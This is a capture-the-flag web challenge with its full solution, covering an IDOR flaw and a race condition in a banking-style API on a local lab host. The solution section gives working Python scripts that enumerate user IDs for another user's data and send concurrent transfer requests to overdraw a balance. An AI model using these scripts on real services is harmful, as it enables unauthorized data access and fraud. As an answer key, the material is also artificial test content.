# Challenge 18: Race Condition + IDOR (Upgraded)
# Category: Web
# Points: 400
# Difficulty: MEDIUM-HARD

## Description
This API has both an IDOR vulnerability AND a race condition. Can you exploit both to get the flag?

**Service:** `http://HOST:5007`

## Vulnerabilities

### 1. IDOR (Insecure Direct Object Reference)
- Access other users' data by changing ID parameter
- No authorization check

### 2. Race Condition (TOCTOU)
- Time-of-Check to Time-of-Use vulnerability
- Balance check and transfer are not atomic
- Can withdraw more than balance by concurrent requests

## Attack Scenario

### IDOR Attack
```
GET /api/user/1 → Your profile
GET /api/user/2 → Admin profile (contains flag!)
GET /api/user/3 → Another user
```

### Race Condition Attack
```
1. Check balance: $100
2. Send 10 concurrent withdrawal requests for $100 each
3. All check pass (balance > $100)
4. All withdrawals execute
5. Final balance: -$900 (but you have $1000!)
```

## Solution

### IDOR Exploitation
```python
import requests

# Try different user IDs
for user_id in range(1, 10):
    r = requests.get(f"http://localhost:5007/api/user/{user_id}")
    data = r.json()
    if 'flag' in str(data):
        print(f"Found flag in user {user_id}: {data}")
```

### Race Condition Exploitation
```python
import requests
import threading

url = "http://localhost:5007/api/transfer"
results = []

def withdraw():
    r = requests.post(url, json={
        "to": "attacker",
        "amount": 100
    })
    results.append(r.status_code)

# Send 10 concurrent requests
threads = []
for _ in range(10):
    t = threading.Thread(target=withdraw)
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print(f"Successful withdrawals: {results.count(200)}")
```
